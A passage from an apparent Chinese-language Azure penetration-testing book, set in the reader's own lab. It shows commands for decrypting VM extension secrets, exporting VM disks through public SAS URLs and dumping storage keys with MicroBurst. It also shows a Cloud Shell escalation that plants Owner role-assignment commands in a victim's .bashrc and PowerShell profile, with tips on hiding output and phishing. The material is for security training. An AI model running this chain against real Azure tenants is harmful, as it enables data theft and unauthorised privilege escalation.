  \ ISE 会话中也可能被看到漂浮着。\n>\n> 作为 VM 上的默认本地管理员帐户，您可以打开 PowerShell ISE 并查看是否有任何脚本被自动恢复。作者见过许多情况，管理员会通过在\
  \ ISE 中执行的脚本将 VM 加入域，但由于关闭不当，凭据可以在下一次使用本地管理员用户登录的 ISE 会话中被恢复。\n\n作为 VM 上的本地管理员，我们可以使用\
  \ VM 上的证书来解密由 VM 扩展存储的受保护设置。为了从扩展中提取这些数据点，我们将采取以下步骤：\n\n- 1. 以本地管理员身份在 Windows VM\
  \ 上打开一个 PowerShell 会话。\n- 2. 从 MicroBurst 工具包导入 `Get-AzureVMExtensionSettings` 函数：\
  \ `https://github.com/NetSPI/MicroBurst/blob/master/Misc/Get-AzureVMExtensionSettings.ps1`。\n\
  - 3. 运行 `Get-AzureVMExtensionSettings` 函数并观察结果。\n\n运行此脚本后，您应该希望在输出中看到多个 `ProtectedSettingsDecrypted`\
  \ 实例，其中包含敏感的扩展信息。如果您之前按照命令执行技术进行操作，您还应该在结果中看到之前发出的命令。\n\n> **重要说明**\n>\n> 由于 Jake\
  \ Karnes 在解释允许我们读取这些文件的核心问题方面做得更好，请查看他的博客，了解该问题的来源和利用方法： `https://blog.netspi.com/decrypting-azure-vm-extension-settings-with-get-azurevmextensionsettings/`。\n\
  \n现在我们已经介绍了提取凭据的内存和磁盘上选项，让我们来看一下使用 Azure 磁盘导出的更静态类型的分析。\n\n#### 利用磁盘导出和快照导出功能\n\n\
  与本地 VM 一样，Azure VM 也有虚拟磁盘附加用于数据存储。至少，Azure VM 有一个操作系统磁盘附加，但它也可以附加额外的數據磁盘。这些磁盘可能包含渗透测试人员可以在后续攻击阶段利用的有用信息。\n\
  \nAzure 平台有一个名为磁盘导出的功能，可用于生成临时公共共享访问签名（SAS）URL 以下载 VM 磁盘。此功能的目的在于使管理员和开发人员更轻松地将磁盘从一个\
  \ Azure 区域复制到另一个区域，例如灾难恢复的情况。此功能也可以被攻击者利用来将数据外泄到组织之外！\n\n要从 Azure 门户使用此功能，您可以转到\
  \ Azure 中的磁盘刀片，选择一个磁盘，单击磁盘导出选项，然后单击图 5.28 中突出显示的生成 URL 按钮：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_218_0.png)\n\
  \n图 5.28 – 磁盘导出的 URL 生成\n\n需要注意的是，磁盘导出功能只能用于未附加到正在运行的 VM 的磁盘。如果磁盘附加到正在运行的 VM，我们可以先创建磁盘的快照，然后使用类似的快照导出功能（图\
  \ 5.29）生成临时 SAS URL，我们可以使用它从互联网下载快照：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_219_0.png)\n\
  \n图 5.29 – 快照 URL 功能\n\n由于多种原因，这些磁盘和快照最终可能会存储在存储帐户中。当这些存储帐户中的文件被公开可用时，这会产生更大的影响。\n\
  \n> **重要说明**\n> 下载 VHD 文件时，请记住文件的大小。来自 Azure 门户的典型 HTTP 网络下载可能难以处理大型磁盘。此外，您可能希望使用具有足够磁盘空间的\
  \ Azure VM 来复制 VHD 文件。通过使用 Azure 后台网络将文件复制到 VM 磁盘，您可能会在下载过程中节省大量时间。\n\n如前所述，下载 Azure\
  \ 虚拟磁盘可能会产生显著的带宽影响，因此在实践中可能不是最有趣的练习。在渗透测试中，当您能够访问磁盘上的所有文件和密码哈希时，您的耐心可能会得到回报。此外，我们甚至可以在\
  \ Hyper-V 中启动 VHD 文件。\n\n需要说明的另一项是磁盘使用的加密。如果磁盘使用客户管理的密钥加密（请参阅 **Encryption** 选项卡），您将需要从密钥库获取密钥来解密它。这超出了本书的范围，但在您处理磁盘时需要记住这一点。\n\
  \n##### 动手练习 – 使用 PowerZure 外泄 VM 磁盘\n\n在本练习中，我们将利用 Azure VM 的磁盘导出功能来外泄未附加或保留的 VM\
  \ 磁盘。以下是我们将在本练习中完成的任务：\n\n- 1. 在您的渗透测试 VM 上打开 PowerShell。\n- 2. 使用以下命令通过身份验证连接到\
  \ Azure。系统提示时，输入 `contributoruser` 帐户的凭据，该帐户是在本章前面场景设置脚本中创建的：\n\n```\nPS C:\\> Connect-AzAccount\n\
  ```\n\n- 3. 在 PowerShell 控制台中，使用以下命令导入 PowerZure 模块：\n\n```\nPS C:\\> cd C:\\Users\\\
  $env:USERNAME\\PowerZure\nPS C:\\> Import-Module .\\PowerZure.ps1\n```\n\n以下是命令的屏幕截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_220_0.png)\n\n图 5.30 – 将 PowerZure 导入会话\n\
  \n- 4. 使用以下命令获取所有未附加 VM 磁盘的列表：\n\n```\nPS C:\\> Get-AzDisk | Where-Object {$_.DiskState\
  \ -ne \"Attached\"} | Select Name, DiskState, Encryption\n```\n\n以下是命令输出的屏幕截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_221_0.png)\n\n图 5.31 – 可供导出的磁盘\n\n命令的输出应返回所有当前未附加到正在运行的\
  \ VM 的托管磁盘及其加密状态。在您的输出中，您应该会看到一个以 winvm02 开头的磁盘；请记下磁盘名称，因为它将在下一步中使用。\n\n- 5. 在 PowerShell\
  \ 控制台中，使用以下命令生成用于导出上一步中识别的磁盘的公开可访问 URL。用上一步中识别的磁盘名称替换 `<DISK_NAME_FROM_STEP_4>`\
  \ 占位符：\n\n```\nPS C:\\> Get-AzureVMDisk -DiskName <DISK_NAME_FROM_STEP_4>\n```\n\
  \n以下是命令及其输出的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_221_1.png)\n\n图 5.32\
  \ – 磁盘导出 URL 生成\n\nGet-AzureVMDisk 是 PowerZure 模块，它利用磁盘导出功能生成下载 VM 磁盘的链接。您应该从命令输出中获得一个\
  \ URL。请记下此 URL，因为它将在下一步中使用。\n\n- 6. 这最后一步是完全可选的。如果您想在这里节省时间、带宽和磁盘空间，您可以暂停练习，并在未来测试中遇到磁盘时记住该技术。除了对磁盘进行取证以查找文件和哈希之外，在本练习的这一点上我们对磁盘并没有太多可做的。\n"
- "## 6 在 PaaS 服务上利用 Contributor 权限\n\n在上一章中，我们探讨了如何使用 Contributor 角色来利用 Azure 资源进行以\
  \ **Infrastructure as a Service (IaaS)** 为中心的场景。我们重点关注如何利用 Contributor 角色的凭据将权限提升到\
  \ Azure RBAC 所有者角色、搜寻其他凭据以及从虚拟机外泄数据。在本章中，我们将探讨如何为 **Platform as a Service (PaaS)**\
  \ 场景实现类似目标。本章的一般概念会有一些重叠，但我们将重点关注这些概念在应用于 PaaS 场景时有何不同。\n\n\n\n\n\n在本章中，我们将介绍以下主要主题：\n\
  \n- 准备 Contributor（PaaS）利用场景\n- 攻击存储帐户\n- 从密钥保管库中窃取密钥、机密和证书\n- 利用 Web 应用进行横向移动和权限提升\n\
  - 从自动化帐户中提取凭据\n\n### 准备 Contributor（PaaS）利用场景\n\n要跟随本章的练习进行操作，你需要在自己的 Azure 订阅中设置一个具有\
  \ Contributor 权限的用户和一些易受攻击的工作负载配置。与前几章一样，我们已使用 PowerShell 脚本实现了自动化，你可以在 Azure Cloud\
  \ Shell 中运行该脚本。在继续之前，请确保你已经运行了清理脚本，以移除前几章中的资源。这将有助于我们避免脚本执行异常。\n\n以下是本练习中我们将完成的任务：\n\
  \n- **任务 1：** 创建一个具有 Contributor 权限的测试用户帐户。\n- **任务 2：** 为所有场景部署易受攻击的工作负载。\n\n让我们开始吧：\n\
  \n1. 打开 Web 浏览器，浏览到 Azure 门户 `https://portal.azure.com`。使用你的 `azureadmin` 凭据登录。\n\
  2. 在 Azure 门户中，单击右上角的 **Cloud Shell** 图标。选择 **PowerShell**：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_226_0.png)\n\
  \n图 6.1 – 单击图标以打开 Cloud Shell\n\n3. 在 Cloud Shell 窗格中的 PowerShell 会话中，运行以下命令以下载一个脚本，该脚本用于创建具有\
  \ Contributor 权限的用户帐户并设置所需的易受攻击的工作负载。通过列出目录内容来验证下载：\n\n```\nPS C:\\> Invoke-WebRequest\
  \ http://bit.ly/contributor-paas-scenarios -O contributor-paas-scenarios.ps1\nPS\
  \ C:\\> Get-ChildItem\n```\n\n缩短 URL 指向的目标 GitHub URL 是：`https://raw.githubusercontent.com/PacktPublishing/Penetration-Testing-Azure-for-Ethical-Hackers/main/chapter-6/resources/contributor-paas-scenario.ps1`。\n\
  \n以下是其外观截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_227_0.png)\n\n图 6.2 – 下载\
  \ Contributor PaaS 场景脚本\n\n4. 使用以下命令运行下载的脚本，以部署本章练习所需的对象和资源：\n\n```\nPS C:\\> ./contributor-paas-scenarios.ps1\n\
  ```\n\n当提示输入密码时，输入 `myPassword123` 并按 *Enter*。等待脚本部署完成。部署大约需要八分钟才能完成：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_227_1.png)\n\
  \n图 6.3 – 运行 Contributor PaaS 场景脚本\n\n#### 该脚本的作用是什么？\n\n该脚本在 Azure 订阅中创建一个具有 Contributor\
  \ 权限的用户帐户。该脚本还会设置图 6.4 中所示的资源和对象：\n\n- 一个具有关联托管标识的 Web 应用\n- 带有防火墙规则的 Azure SQL\
  \ 数据库和 Azure 存储\n- 包含机密、密钥和证书的 Azure 密钥保管库\n- 一个 Azure 自动化帐户\n- 一个 Ubuntu Linux\
  \ 虚拟机：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_228_0.png)\n\n图 6.4 – Contributor\
  \ PaaS 利用场景\n\n5. 脚本完成后，你将在输出部分看到本练习后续所需的关键信息。将这些信息复制到记事本文档中，以备后用。你需要从输出部分获取四个值：\n\
  \nAzure Contributor User：这是对 Azure 订阅具有 Contributor 权限的 Azure 管理员用户名。\n\nAzure Contributor\
  \ User Password：这是 Azure Contributor 管理员用户的密码。\n\n**Linux VM FQDN：** 用于在某个练习中挂载映像的\
  \ Linux 虚拟机的 FQDN。这是必需的，因为 PentestVM 上实现的 WSL 尚不支持此功能。\n\n**Linux VM Password：**\
  \ 用于在某个练习中挂载映像的 Linux 虚拟机的密码：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_229_0.png)\n\
  \n图 6.5 – 获取脚本输出\n\n你现在已成功创建了将在本章后续练习中使用的资源。本章中我们将探索的第一个资源是存储帐户。\n\n### 攻击存储帐户\n\
  \nAzure 存储帐户是 Azure 中主要的数据存储解决方案。其他 Azure 服务（如 App Service 和 Container Registry）在后端依赖它进行数据存储。该解决方案本身提供五种服务，可用于存储不同的数据集，包括非结构化应用程序数据对象（Azure\
  \ Blob 存储）、NoSQL 存储中的半结构化应用程序数据（Azure 表存储）、云中的托管文件共享（Azure 文件）、用于可靠消息传递的消息存储（Azure\
  \ 队列存储），以及用于大数据工作负载的数据湖（Azure Data Lake Storage Gen2）。可以想象，这项服务是攻击者的主要目标！在本章中，我们将重点关注\
  \ Azure Blob 存储和 Azure 文件。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_229_1.png)\n\
  \n图 6.6 – Azure 存储\n\nContributor 角色拥有读取和修改此服务管理平面上的任何配置的权限（向其他用户分配权限除外），但根据 RBAC\
  \ 权限，它并不固有地拥有读取或修改数据平面数据的权限（图 6.7）。这听起来可能令人困惑，但请注意，Contributor 角色策略文档并未指定任何 `dataActions`\
  \ 权限：\n\n```json\n\"permissions\": [\n  {\n    \"actions\": [\n      \"*\"\n   \
  \ ],\n    \"notActions\": [\n      \"Microsoft.Authorization/*/Delete\",\n     \
  \ \"Microsoft.Authorization/*/Write\",\n      \"Microsoft.Authorization/elevateAccess/Action\"\
  ,\n      \"Microsoft.Blueprint/blueprintAssignments/write\",\n      \"Microsoft.Blueprint/blueprintAssignments/delete\"\
  ,\n      \"Microsoft.Compute/galleries/share/action\"\n    ],\n    \"dataActions\"\
  : [],\n    \"notDataActions\": []\n  }\n]\n```\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_230_0.png)\n\
  \n图 6.7 – Azure Contributor 权限\n\nAzure AD 标识需要被授予额外的 `dataActions` 权限（例如图 6.8 中列出的权限），才能使用\
  \ Azure AD 访问令牌访问数据平面。随着 Microsoft 越来越多地采用通过 Azure RBAC 暴露服务数据平面访问权限的这种模式，在 Azure\
  \ 中利用服务数据平面而无需转向其他选项的机会将会更多：\n\n| 角色 | 描述 |\n|---|---|\n| Storage Blob Data Contributor\
  \ | 允许对 Azure 存储 blob 容器和数据进行读取、写入和删除访问 |\n| Storage Blob Data Owner | 允许对 Azure\
  \ 存储 blob 容器和数据进行完全访问，包括分配 POSIX 访问控制。 |\n| Storage Blob Data Reader | 允许对 Azure\
  \ 存储 blob 容器和数据进行读取访问 |\n| Storage File Data SMB Share Contributor | 允许通过 SMB 对\
  \ Azure 存储文件共享进行读取、写入和删除访问 |\n| Storage File Data SMB Share Elevated Contributor\
  \ | 允许通过 SMB 对 Azure 存储文件共享进行读取、写入、删除和修改 NTFS 权限访问 |\n| Storage File Data SMB Share\
  \ Reader | 允许通过 SMB 对 Azure 文件共享进行读取访问 |\n| Storage Queue Data Contributor | 允许对\
  \ Azure 存储队列和队列消息进行读取、写入和删除访问 |\n| Storage Queue Data Message Processor | 允许对 Azure\
  \ 存储队列消息进行查看、接收和删除访问 |\n| Storage Queue Data Message Sender | 允许发送 Azure 存储队列消息\
  \ |\n| Storage Queue Data Reader | 允许对 Azure 存储队列和队列消息进行读取访问 |\n\n图 6.8 – Azure\
  \ 存储相关角色\n\n以下是完成所述任务的步骤：\n\n1. 在 Pentest VM 中，右键单击“开始”按钮，然后单击“Windows PowerShell（管理员）”。\n\
  \n2. 使用以下命令向 Azure PowerShell 进行身份验证：\n\n```\nConnect-AzAccount\n```\n\n3. 当提示进行身份验证时，使用\
  \ Azure Contributor User 值（来自脚本输出）作为用户名，并使用 Azure Contributor User Password 值（同样来自脚本输出）作为密码：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_232_0.png)\n\n图 6.9 – 以 contributoruser\
  \ 身份进行身份验证的输出\n\n你现在已作为 contributoruser 帐户通过身份验证。该帐户在 Azure 订阅中被分配了 Contributor\
  \ 角色。该帐户将在后续练习中用于利用 Azure 环境中的各种弱点。请保持 PowerShell 会话打开以进行下一个练习。\n\n4. 使用以下命令将 MicroBurst\
  \ 模块导入到你的 PowerShell 会话中：\n\n```\ncd .\\MicroBurst\\\n```\n\n```\nImport-Module\
  \ .\\MicroBurst.psm1\n```\n\n5. MicroBurst 工具包将根据你系统上安装的 PowerShell 模块导入不同的 PowerShell\
  \ 函数。忽略有关未安装 MSOnline 模块的警告：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_232_1.png)\n\
  \n图 6.10 – 导入 MicroBurst PowerShell 模块\n\n\n\n\n\n- 6. 使用 `Get-AzPasswords` 函数对\
  \ Azure Storage 实例进行全面转储。此函数也可用于提取其他 PaaS 服务的数据平面密钥，但我们将使用 N 选项暂时排除这些服务：\n\n```\n\
  Get-AzPasswords -AutomationAccounts N -AppServices N\n-Keys N -ACR N -CosmosDB N\
  \ -Verbose | Out-GridView\n```\n\n- 7. 在提示选择 Azure 订阅时，选择你的测试 Azure 订阅并点击确定：\n\n\
  ![](img/4fa338e84e0a590967a142dd798ba4e2_233_0.png)\n\n图 6.11 – 选择适当的订阅\n\n- 8.\
  \ 在 resulting 输出中，你应该会看到从存储账户转储的凭据。这些凭据可用于访问这些服务以外泄数据或搜寻其他凭据。在输出窗口中，查找名称格式为 `privstoreXXXXXX`\
  \ 的存储账户。复制其中一行，使用 `Ctrl + C`。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_233_1.png)\n\
  \n图 6.12 – MicroBurst 存储账户密钥输出\n\n- 9. 在 Pentest VM 中，打开 PowerShell 提示符并使用以下命令安装\
  \ Azure Storage Explorer：\n\n```\nchoco install microsoftazurestorageexplorer -y\n\
  ```\n\n以下是该命令的输出：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_234_0.png)\n\n图 6.13\
  \ – Azure Storage Explorer 安装\n\n- 10. 在 Pentest VM 中，点击 **开始** 按钮，搜索 **Storage\
  \ Explorer**，并选择 **Storage Explorer** 选项：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_234_1.png)\n\
  \n图 6.14 – 打开 Storage Explorer\n\n- 11. 在 Connect to Azure Storage 窗口中，选择存储账户：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_235_0.png)\n\n图 6.15 – 添加存储账户\n\n- 12.\
  \ 在 Select Authentication Method 窗口中，选择 Account name and key 然后点击 Next：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_235_1.png)\n\
  \n图 6.16 – 选择 Account name and key\n\n- 13. 在 **Enter Connection Info** 窗口中，输入以下信息：\n\
  \n- **Display name:** 来自本练习 *Step 8* 的账户名称\n- **Account Name:** 来自本练习 *Step 8* 的账户名称\n\
  - **Account Key:** 来自本练习 *Step 8* 的账户密钥\n\n点击 **Next**：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_236_0.png)\n\
  \n- 14. 在 **Summary** 窗口中，点击 **Connect.**\n\n- 15. 查看文件并注意我们现在已对存储账户及其所有服务的 content\
  \ 拥有持久访问权限。这为攻击者造成损害提供了很大的空间。例如，攻击者可以在勒索软件攻击中加密服务中的数据，向 NoSQL 表存储注入恶意数据，或通过存储队列污染应用程序：\n\
  \n现在我们已经了解了如何保持对存储账户的连接，让我们转换思路，在存储账户内部攻击 Cloud Shell 存储文件以实现权限提升。\n\n### 攻击 Cloud\
  \ Shell 存储文件\n\n如果你一直按照书中的示例操作，你应该对 Azure Cloud Shell（基于浏览器的命令行界面）非常熟悉。但如果我们告诉你，通过让你使用此\
  \ shell，我们让你陷入了失败，你会怎么想？我们知道你作为作者对我们寄予了很大信任，如果我们辜负了这份信任，我们深表歉意。所以，让我们花点时间从这种情况中吸取教训，展示如何利用你为自己创造的易受攻击环境。\n\
  \n你第一次以 azureadmin 用户身份使用 Cloud Shell 时，会被提示在存储账户的文件服务中创建一个文件共享。如果你选择默认选项，平台会自动创建一个以\
  \ cs 为前缀的专用存储账户来托管文件共享（图 6.20）。你也可以选择使用现有存储账户来托管此共享。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_238_0.png)\n\
  \n图 6.20 – 示例 Cloud Shell 存储账户\n\n存储账户中的此文件共享服务用于在会话之间持久化数据。创建后，它将在用户后续 Cloud Shell\
  \ 会话的 $Home 目录中自动挂载为 clouddrive 文件夹。你可以通过在 Cloud Shell 中运行 ls 命令（Bash 或 PowerShell）来验证，如图\
  \ 6.21 所示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_238_1.png)\n\n图 6.21 – Cloud\
  \ Shell 会话中挂载的文件共享\n\n但这个文件共享背后是什么？此共享以 .img 文件的形式存储 EXT2 文件系统。\n\n共享的名称和映像文件名通常表示\
  \ Cloud Shell 所连接的 Azure AD 用户。在图 6.22 中，我们可以看到 cs-azureadmin-azurepentesting-com-1003200107d764bc\
  \ 文件共享包含 acc_azureadmin.img 文件（在 .cloudconsole 文件夹下）。此信息可以与 Azure AD/RBAC 侦察结果相关联，以确定\
  \ shell 用户是否被分配了特权权限。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_239_0.png)\n\n\
  图 6.22 – 示例 Cloud Shell 文件\n\n那么，这里攻击场景是什么？正如我们之前提到的，此 IMG 文件在每次启动时都会挂载到用户 Cloud\
  \ Shell 会话的主目录。因为 Contributor 角色拥有通过存储账户密钥下载此 IMG 文件的权限，我们可以利用该访问权限在 Linux 系统上下载并挂载\
  \ IMG 文件。\n\n此时，我们可以读取文件中的任何敏感信息，但也可以对其进行修改，以便下次由目标账户挂载时运行命令。如果我们针对正确的账户，这就提供了通过在更特权用户的\
  \ Cloud Shell 会话中运行命令来提升权限的机会，例如 Azure AD 全局管理员或订阅 Owner。\n\n**重要说明**\n\n有关此攻击原始研究的完整说明，请参阅以下\
  \ NetSPI 博客：https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-cloud-shell/。\n\
  \n对于下一个练习，我们假设你一直从 Cloud Shell 运行环境设置脚本（按指示）。至少，我们假设你已经为一直使用的 azureadmin 用户账户设置了\
  \ Cloud Shell 存储账户。\n\n#### 动手练习 – 利用 Cloud Shell 账户提升权限\n\n在本练习中，我们将利用 Cloud Shell\
  \ 卷映像，在特权用户使用 Cloud Shell 时以其权限运行敏感命令。我们将涵盖的过程将遵循图 6.23 中突出显示的四步流程。首先，我们将下载更高特权用户的\
  \ Cloud Shell 卷映像，我们将在之前部署的 Linux VM 上挂载映像，我们将植入想要运行的命令并重新上传回 Cloud Shell 文件共享。\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_240_0.png)\n\n图 6.23 – 示例 Cloud Shell\
  \ 文件\n\n以下是本练习中我们将完成的任务：\n\n- **Task 1:** 使用 Lava 大规模扫描 Azure 文件共享。\n- **Task 2:**\
  \ 使用 Lava 下载 Azure 文件共享中的文件。\n- **Task 3:** 利用 Cloud Shell 映像并将其上传回。\n- **Task 4:**\
  \ 验证权限提升利用。\n\n以下是完成任务的步骤：\n\n- 1. 在连接到 Pentest Windows VM 的 RDP 会话中，以管理员身份打开 PowerShell。\n\
  \n- 2. 在 PowerShell 控制台中，输入以下命令通过 SSH 连接到之前创建的 pentest Linux VM。将 <linux_FQDN> 替换为脚本输出中\
  \ Linux VM FQDN 的值。当提示确认真实性时，输入 yes 并按 Enter。当提示输入密码时，输入脚本输出中 Linux VM Password\
  \ 的值。\n\n```\nssh pentestadmin@<linux_FQDN>\n```\n\n以下是命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_241_0.png)\n\
  \n图 6.24 – SSH 连接到 Linux VM\n\n- 3. 在 pentest Linux VM 的 Bash shell 中，使用以下命令切换到\
  \ root 用户：\n\n```\npentestadmin@ptlinuxvm:~# sudo su -\n```\n\n- 4. 使用以下命令以 Contributor\
  \ 用户身份通过 Azure CLI 对 Azure 进行身份验证。将 <domain_name> 替换为你的 Azure AD 域名。另将 <contributor_user_password>\
  \ 替换为 contributoruser 账户的密码：\n\n```\naz login -u contributoruser@<domain_name> -p\
  \ <contributor_user_password>\n```\n\n\n\n\n这是输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_242_0.png)\n\
  \n图6.25 – 从Linux VM登录Azure CLI\n\n5. 使用以下命令下载并运行Lava：\n\n```\ngit clone https://github.com/mattrotlevi/lava.git\n\
  ```\n\n```\ncd lava/\n```\n\n```\npython3 lava.py\n```\n\n这是输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_242_1.png)\n\
  \n图6.26 – Lava命令的输出\n\n6. 使用以下命令验证当前用户和权限：\n\n```\nexec_priv_show\n```\n\n从输出中可以看到，用户仅具有Contributor角色分配：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_243_0.png)\n\n图6.27 – Lava中显示的Contributor用户权限\n\
  \n7. 扫描Azure订阅中的文件共享，以查找潜在的Cloud Shell镜像。可以使用以下Lava命令完成此操作：\n\n```\nexec_stg_file_scan\n\
  ```\n\n此命令利用对访问密钥的访问来扫描Azure订阅中的文件共享。可以看到，我们有一个由Azure Cloud Shell使用的文件共享：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_243_1.png)\n\
  \n图6.28 - Lava识别敏感文件\n\n8. 使用以下命令下载Azure文件共享中的文件。我们假设你正在一个隔离的Azure环境中执行此练习，该环境只有少数几个文件共享。在具有多个文件共享的环境中运行前面的命令可能需要很长时间才能完成：\n\
  \n```\nexec_stg_file_download\n```\n\n这会将文件下载到渗透测试Linux VM上的临时目录中。请注意以下截图中突出显示的下载位置：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_244_0.png)\n\n*图6.29 – 使用Lava下载的Cloud\
  \ Shell文件*\n\n9. 下载完成后，使用`exit`命令退出Lava：\n\n```bash\nexit\n```\n\n10. 返回Bash shell，使用以下命令挂载下载的镜像文件。将`<download_location>`替换为你在本练习*第8步*中记下的下载路径：\n\
  \n```bash\nmount <download_location>/.cloudconsole/acc_azureadmin.img /mnt\n```\n\
  \n这是此操作的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_244_1.png)\n\n*图6.30 – 在Linux\
  \ VM中挂载acc_azureadmin.img文件*\n\n11. 通过输入以下命令并按*Tab*键来浏览已挂载的驱动器：\n\n```bash\nls /mnt/\n\
  ```\n\n你应该会看到来自Cloud Shell用户先前会话的持久文件和数据的输出。这包括敏感信息，例如用户的shell上下文信息。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_245_0.png)\n\
  \n图6.31 – 已挂载Cloud Shell文件的目录列表\n\n12. 切换到已挂载的驱动器目录，并输入以下命令，将恶意命令追加到.bashrc文件中，以提升当前Contributor用户的权限：\n\
  \n```\ncd /mnt\necho \"az role assignment create --role \"Owner\" --assignee $(az\
  \ ad user list --display-name contributoruser | jq '.[]' | jq -r '.userPrincipalName')\"\
  \ >> .bashrc\n```\n\nbashrc是一个Bash shell脚本，每当shell会话以交互方式启动时都会运行。前面的命令将确保下次目标特权用户打开Cloud\
  \ Shell会话时，执行提升Contributor用户账户权限的命令。这是此操作的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_245_1.png)\n\
  \n图6.32 – 修改bashrc文件\n\n13. 要对PowerShell会话执行相同操作，我们需要先在用户的主目录中创建两个目录。PowerShell配置文件将位于此处。如果收到有关目录已存在的错误消息，可以忽略并继续下一步：\n\
  \n```\nmkdir .config\nmkdir .config/PowerShell\n```\n\n14. 与我们对.bashrc文件所做的类似，我们将通过将以下命令添加到PowerShell配置文件中，使contributoruser成为订阅的所有者：\n\
  \n```\necho \"New-AzRoleAssignment -UserPrincipalName (Get-AzADUser -StartsWith\
  \ contributoruser).UserPrincipalName -RoleDefinitionName Owner\" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1\n\
  ```\n\n这是前两个步骤的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_246_0.png)\n\n图6.33\
  \ – PowerShell配置文件修改\n\n15. 使用以下命令从会话中卸载驱动器：\n\n```\ncd ..\numount /mnt\n```\n\n\
  16. 现在，我们将驱动器上传回存储帐户并覆盖现有版本。首先，我们将获取存储帐户的名称并将其存储在变量中。将<storage_acct_name>替换为原始Cloud\
  \ Shell文件所下载的存储帐户的名称（以cs前缀开头）：\n\n```\naz storage account list --query [].name -o\
  \ tsv\nstoragename=<storage_acct_name>\n```\n\n这是此操作的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_246_1.png)\n\
  \n图6.34 – 识别Cloud Shell存储帐户\n\n17. 使用以下命令获取访问密钥和文件共享，并将镜像上传回去。将<download_location>替换为你在本练习第8步中记下的位置：\n\
  \n```\nkey=$(az storage account keys list -n $storagename --query [0].value -o tsv)\n\
  ```\n\n```\ncsfileshare=$(az storage share list --account-key $key --account-name\
  \ $storagename --query [].name -o tsv)\n```\n\n```\naz storage file upload --account-key\
  \ $key --account-name $storagename --share-name $csfileshare --path \".cloudconsole/acc_azureadmin.img\"\
  \ --source \"<download_location>/.cloudconsole/acc_azureadmin.img\"\n```\n\n之后上传过程将开始。这将覆盖共享中的现有文件。这是此操作的截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_247_0.png)\n\n图6.35 – 上传修改后的.img文件\n\n\
  18. 最后，我们需要以azureadmin用户账户打开Cloud Shell实例来触发攻击。为此，我们将以azureadmin账户登录，并在门户中打开Cloud\
  \ Shell。从下面的截图中可以看到，我们的命令已在Cloud Shell实例中执行，并且我们的contributoruser账户现在已成为订阅的所有者：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_248_0.png)\n\n图6.36 – 将contributoruser添加为所有者\n\
  \n作为攻击者，我们可能希望在此场景中稍微隐蔽一些。为了抑制我们在前面截图中看到的消息，可以在PowerShell命令的末尾使用| out-null函数来重定向输出。或者，我们可以在Bash\
  \ shell攻击的末尾使用&>/dev/null。这将防止命令执行显示在管理员Cloud Shell的输出中。\n\n> **重要说明**\n> 在实际攻击场景中，受害者Cloud\
  \ Shell账户可能需要一段时间才能打开新会话。为加快此过程，你可以发送一封包含https://shell.azure.com/链接的钓鱼邮件。该链接不仅看起来合法，而且一旦加载站点，就会启动Cloud\
  \ Shell会话。\n\n19. 现在，让我们验证确实已将权限提升为Owner角色。我们可以在Lava中运行priv_show命令来验证这一点：\n\n```\n\
  cd ~/lava\npython3 lava.py\nexec priv_show\n```\n\n你应该能够看到，由于成功的权限提升攻击，用户现在已被分配OWNER角色：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_249_0.png)\n\n图6.37 – 使用Lava确认修改后的角色\n\
  \n因此，既然我们已经验证攻击成功，让我们从Contributor用户中移除OWNER角色分配，以便我们仅使用Contributor角色完成剩余练习。\n\n\
  20. 在你以azureadmin用户登录的Cloud Shell（PowerShell）环境中，逐行运行以下命令，以移除Contributor用户的Owner角色分配：\n\
  \n```\n$upnsuffix=$(az ad signed-in-user show --query userPrincipalName --output\
  \ tsv | sed 's/.*@//')\n$contributoruser = \"contributoruser@$upnsuffix\"\n$contributoruserid=$(az\
  \ ad user list --upn $contributoruser --query [].objectId -o tsv)\naz role assignment\
  \ delete --assignee $contributoruserid --role \"Owner\"\n```\n\n\n\n\n\n以下是输出的截图和要删除的行：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_251_0.png)\n\n图 6.40 – 删除 .bashrc 文件的修改\n\
  \n现在我们已经看到了 Cloud Shell 如何被滥用，让我们来看看如何从 Azure Key Vaults 中收集敏感信息。\n\n### 从 Key Vaults\
  \ 中掠夺密钥、机密和证书\n\nAzure Key Vault 是在 Azure 平台中管理应用程序机密、密钥和证书的服务（图 6.41）。Key Vault\
